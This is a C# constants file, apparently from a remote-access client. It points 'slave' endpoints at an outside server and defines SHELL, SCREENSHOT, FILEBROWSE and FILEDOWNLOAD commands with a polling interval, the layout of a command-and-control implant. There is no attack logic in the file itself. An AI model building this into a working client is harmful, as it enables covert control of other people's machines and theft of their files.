using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TestAPP.lib
{
    static class Constants
    {
        public const string BASE_URL = "https://rune-master.onrender.com";
        public const string API_SLAVE_COMMAND_URL = BASE_URL + "/api/slave/command";
        public const string API_SLAVE_TEXT_RESPONSE_URL = BASE_URL + "/api/slave/response/text";
        public const string API_SLAVE_FILEBROWSE_RESPONSE_URL = BASE_URL + "/api/slave/response/filebrowse";



        public const string SLAVE_COMMAND_KEY_TYPE = "type";
        public const string SLAVE_COMMAND_KEY_COMMAND = "command";

        public const string SLAVE_COMMAND_KEY_VALUE_SHELL = "SHELL";
        public const string SLAVE_COMMAND_KEY_VALUE_SCREENSHOT = "SCREENSHOT";
        public const string SLAVE_COMMAND_KEY_VALUE_FILEBROWSE = "FILEBROWSE";
        public const string SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD = "FILEDOWNLOAD";

        public const int TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS = 1000;
    }

}
